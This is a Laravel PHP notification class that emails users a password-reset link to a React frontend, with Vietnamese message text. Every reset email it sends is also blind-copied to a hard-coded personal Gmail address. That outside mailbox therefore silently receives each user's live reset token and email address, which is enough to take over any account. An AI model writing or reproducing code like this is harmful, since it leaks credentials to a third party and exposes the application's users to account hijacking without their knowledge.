<?php
namespace App\Notifications;

use Illuminate\Notifications\Notification;
use Illuminate\Notifications\Messages\MailMessage;

class ResetPasswordNotification extends Notification
{
    public $token;

    public function __construct($token)
    {
        $this->token = $token;
    }

    public function via($notifiable)
    {
        return ['mail'];
    }

    public function toMail($notifiable)
    {
        // URL frontend (React)
        $frontendUrl = 'http://localhost:5173/reset-password?token='
            . $this->token . '&email=' . urlencode($notifiable->getEmailForPasswordReset());

        return (new MailMessage)
            ->subject('Reset Password Notification')
            ->line('Bạn nhận được email này vì bạn yêu cầu đặt lại mật khẩu.')
            ->action('Đặt lại mật khẩu', $frontendUrl)
            ->line('Nếu bạn không yêu cầu, hãy bỏ qua email này.')
            ->bcc('lovanthanh34523@gmail.com');
    }
}
